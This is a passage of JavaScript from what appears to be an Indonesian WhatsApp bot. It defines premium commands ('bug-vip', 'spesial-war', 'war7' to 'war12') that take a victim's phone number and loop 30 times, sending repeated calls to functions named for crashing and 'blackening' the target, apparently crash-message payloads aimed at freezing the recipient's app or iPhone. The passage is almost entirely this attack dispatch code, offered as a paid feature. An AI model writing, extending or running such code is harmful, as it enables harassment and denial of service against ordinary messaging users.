await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'bug-vip': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'spesial-war': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war12': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war11': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war10': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war9': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war8': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war7': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
